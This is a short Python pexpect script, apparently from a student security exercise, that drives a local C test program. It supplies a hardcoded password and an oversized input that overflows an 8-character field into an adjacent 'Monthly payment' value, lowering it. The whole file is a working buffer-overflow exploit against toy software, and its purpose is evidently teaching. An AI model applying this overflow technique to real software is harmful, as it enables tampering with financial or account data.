#!/usr/bin/python3

import sys, re, pexpect

terminal = pexpect.spawn("/bin/bash", encoding='utf-8')
terminal.logfile = sys.stdout

terminal.sendline("../C/test")
terminal.expect("Enter password:")
terminal.sendline("IC1Project")
terminal.expect("5 - Exit the program.")

terminal.sendline("2")
terminal.expect("Step 0 success!")
terminal.sendline("12345678FFFFFFFFFFFFFFFFFFFFFFFFFFF0")

terminal.expect("5 - Exit the program.")
terminal.sendline("5")

print("Going beyond 8 symbols overflows into Monthly payment for changing your account number, Decreasing it to 1179010630")
